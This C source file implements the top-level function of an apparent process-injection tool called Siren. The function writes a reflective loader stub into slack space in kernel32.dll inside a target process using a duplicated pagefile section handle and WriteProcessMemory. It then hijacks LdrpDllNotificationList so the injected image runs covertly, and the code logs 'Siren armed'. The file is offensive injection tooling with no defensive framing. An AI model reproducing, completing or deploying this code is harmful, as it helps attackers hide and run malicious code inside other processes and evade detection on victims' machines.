/*
 * src/core/siren_api.c
 *
 * Top-level siren_inject() — orchestrates all pipeline steps:
 *   1. Validate PE
 *   2. Create pagefile section + DuplicateHandle into target  (handoff)
 *   3. Find slack space in carrier module                      (slack)
 *   4. Serialise stub + reflective loader + notify entry       (stub builder)
 *   5. WriteProcessMemory stub blob into slack                 (stub)
 *   6. Patch LdrpDllNotificationList in target                 (notify)
 *   7. Return — injector can exit
 */

#include "siren/siren.h"
#include "pe/pe_parse.h"
#include "slack/slack_finder.h"
#include "handoff/section_handoff.h"
#include "notify/ldr_notify.h"
#include "stub/siren_stub.h"

#include <stdio.h>
#include <string.h>

/* Default carrier module if the caller didn't specify one. */
static const wchar_t *DEFAULT_CARRIER = L"kernel32.dll";

siren_status_t siren_inject(HANDLE                       hProcess,
                            const void                  *pe_bytes,
                            size_t                       pe_size,
                            const siren_inject_options  *opts)
{
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
        return SIREN_E_NULL_ARG;
    if (!pe_bytes || pe_size < sizeof(IMAGE_DOS_HEADER))
        return SIREN_E_BAD_SIZE;

    const wchar_t *carrier =
        (opts && opts->carrier_module) ? opts->carrier_module : DEFAULT_CARRIER;
    int verbose = opts ? opts->verbose : 0;

    siren_status_t r;

#define BAIL(label) do { if (SIREN_FAILED(r)) goto label; } while (0)
#define LOG(fmt, ...) do { if (verbose) fprintf(stderr, "[siren] " fmt "\n", ##__VA_ARGS__); } while (0)

    /* ── Step 1: light PE sanity check ────────────────────────────────── */
    sr_pe_view pe_view;
    r = sr_pe_validate(pe_bytes, pe_size, &pe_view);
    (void)pe_view;
    BAIL(done);
    LOG("PE validated (%zu bytes)", pe_size);

    /* ── Step 2: create pagefile section + hand handle to target ──────── */
    HANDLE hSection = NULL;
    r = siren_section_create_and_handoff(hProcess, pe_bytes, pe_size, &hSection);
    BAIL(done);
    LOG("Section created, handle in target = %p", (void *)hSection);

    /* ── Step 3: find writable slack in carrier module ─────────────────── */
    void  *slack_addr = NULL;
    size_t slack_size = 0;
    r = siren_slack_find(hProcess, carrier, &slack_addr, &slack_size);
    BAIL(done);
    LOG("Slack found at %p (%zu bytes) in carrier", slack_addr, slack_size);

    /* ── Step 4 + 5: serialise stub blob and write it into slack ──────── */
    r = siren_stub_write(hProcess, slack_addr, slack_size, hSection);
    BAIL(done);
    LOG("Stub written into slack");

    /* ── Step 6: hook LdrpDllNotificationList ──────────────────────────── */
    /*
     * The notify entry is embedded at the end of the stub blob (its layout
     * is fixed by siren_stub_write).  The entry address in the target is
     * slack_addr + SIREN_STUB_ENTRY_OFFSET.
     */
    void *entry_addr = (uint8_t *)slack_addr + siren_stub_entry_offset();
    void *stub_addr  = slack_addr;  /* stub is at the very start of the blob */

    r = siren_notify_insert(hProcess, entry_addr, stub_addr, hSection);
    BAIL(done);
    LOG("LdrpDllNotificationList patched — Siren armed");

done:
    if (SIREN_FAILED(r) && verbose)
        fprintf(stderr, "[siren] inject failed: %s\n", siren_status_string(r));
    return r;

#undef BAIL
#undef LOG
}
